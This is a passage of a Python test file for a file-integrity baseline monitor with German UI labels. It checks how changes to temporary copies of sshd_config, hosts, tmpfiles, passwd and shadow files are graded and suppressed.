            roots_baseline_guard_controller.ROOTS_GUARD_SUPPORTED_AREAS
        ),
    )
    roots_baseline_guard_controller.create_roots_baseline_guard_baseline(app)

    import os

    os.utime(grub_file, None)
    app.roots_baseline_guard_trust_vars["Bekannte Systemänderungen ignorieren"].set(
        True
    )
    assert (
        roots_baseline_guard_controller.check_roots_baseline_guard_baseline(app) is True
    )
    assert (
        app.roots_integrity_counts_var.get()
        == "Kritisch: 0 | Warnungen: 0 | Hinweise: 0"
    )
    assert (
        app.roots_baseline_guard_results_table.rows[0][0]
        == "Noch keine Änderungen erkannt."
    )


def test_roots_baseline_guard_lowers_package_style_tmpfiles_changes(tmp_path):
    ssh_file = tmp_path / "sshd_config"
    hosts_file = tmp_path / "hosts"
    tmpfiles_dir = tmp_path / "usr" / "lib" / "tmpfiles.d"
    tmpfiles_dir.mkdir(parents=True)
    tmpfiles_file = tmpfiles_dir / "demo.conf"
    ssh_file.write_text("PermitRootLogin no\n", encoding="utf-8")
    hosts_file.write_text("127.0.0.1 localhost\n", encoding="utf-8")
    tmpfiles_file.write_text("d /run/demo 0755 root root -\n", encoding="utf-8")

    baseline_path = tmp_path / "roots_baseline.json"
    overrides = {
        "SSH Konfiguration": [str(ssh_file)],
        "DNS / Hosts": [str(hosts_file)],
        "Kritische Systemdateien": [str(tmpfiles_file)],
    }
    app = DummyApp(
        baseline_path,
        overrides,
        selected_labels=set(
            roots_baseline_guard_controller.ROOTS_GUARD_SUPPORTED_AREAS
        ),
    )
    roots_baseline_guard_controller.create_roots_baseline_guard_baseline(app)

    tmpfiles_file.write_text(
        "d /run/demo 0755 root root -\n# maintainer refresh\n",
        encoding="utf-8",
    )
    app.roots_baseline_guard_trust_vars["Paketupdates niedriger einstufen"].set(True)
    assert (
        roots_baseline_guard_controller.check_roots_baseline_guard_baseline(app) is True
    )
    assert (
        app.roots_integrity_counts_var.get()
        == "Kritisch: 0 | Warnungen: 1 | Hinweise: 0"
    )
    assert "Paketupdate-/Dienst-Aenderung" in app.roots_baseline_guard_info_text.text


def test_roots_baseline_guard_minimizes_repeating_harmless_changes(tmp_path):
    ssh_file = tmp_path / "sshd_config"
    hosts_file = tmp_path / "hosts"
    passwd_file = tmp_path / "passwd"
    ssh_file.write_text("PermitRootLogin no\n", encoding="utf-8")
    hosts_file.write_text("127.0.0.1 localhost\n", encoding="utf-8")
    passwd_file.write_text("root:x:0:0:root:/root:/bin/bash\n", encoding="utf-8")

    baseline_path = tmp_path / "roots_baseline.json"
    overrides = {
        "SSH Konfiguration": [str(ssh_file)],
        "DNS / Hosts": [str(hosts_file)],
        "Kritische Systemdateien": [str(passwd_file)],
    }
    app = DummyApp(
        baseline_path,
        overrides,
        selected_labels=set(
            roots_baseline_guard_controller.ROOTS_GUARD_SUPPORTED_AREAS
        ),
    )
    roots_baseline_guard_controller.create_roots_baseline_guard_baseline(app)

    import os

    os.utime(hosts_file, None)
    roots_baseline_guard_controller.check_roots_baseline_guard_baseline(app)
    assert (
        app.roots_integrity_counts_var.get()
        == "Kritisch: 0 | Warnungen: 0 | Hinweise: 1"
    )

    app.roots_baseline_guard_trust_vars[
        "Wiederkehrende harmlose Änderungen minimieren"
    ].set(True)
    roots_baseline_guard_controller.check_roots_baseline_guard_baseline(app)
    assert (
        app.roots_integrity_counts_var.get()
        == "Kritisch: 0 | Warnungen: 0 | Hinweise: 0"
    )
    assert (
        app.roots_baseline_guard_results_table.rows[0][0]
        == "Noch keine Änderungen erkannt."
    )
    assert "wiederkehrende harmlose Änderung" in app.roots_baseline_guard_info_text.text


def test_roots_baseline_guard_does_not_minimize_repeating_shadow_hints(tmp_path):
    ssh_file = tmp_path / "sshd_config"
    hosts_file = tmp_path / "hosts"
    shadow_file = tmp_path / "shadow"
    ssh_file.write_text("PermitRootLogin no\n", encoding="utf-8")
    hosts_file.write_text("127.0.0.1 localhost\n", encoding="utf-8")
    shadow_file.write_text("root:*:1:1:99999:7:::\n", encoding="utf-8")

    baseline_path = tmp_path / "roots_baseline.json"
    overrides = {
        "SSH Konfiguration": [str(ssh_file)],
        "DNS / Hosts": [str(hosts_file)],
        "Kritische Systemdateien": [str(shadow_file)],
    }
    app = DummyApp(
        baseline_path,
        overrides,
        selected_labels=set(
            roots_baseline_guard_controller.ROOTS_GUARD_SUPPORTED_AREAS
        ),
    )
    roots_baseline_guard_controller.create_roots_baseline_guard_baseline(app)

    import os

    os.utime(shadow_file, None)
    roots_baseline_guard_controller.check_roots_baseline_guard_baseline(app)
    assert (
        app.roots_integrity_counts_var.get()
        == "Kritisch: 0 | Warnungen: 0 | Hinweise: 1"
    )

    app.roots_baseline_guard_trust_vars[
        "Wiederkehrende harmlose Änderungen minimieren"
    ].set(True)
    roots_baseline_guard_controller.check_roots_baseline_guard_baseline(app)
    assert (
        app.roots_integrity_counts_var.get()
        == "Kritisch: 0 | Warnungen: 0 | Hinweise: 1"
    )
    assert "shadow" in app.roots_signal_summary_var.get()
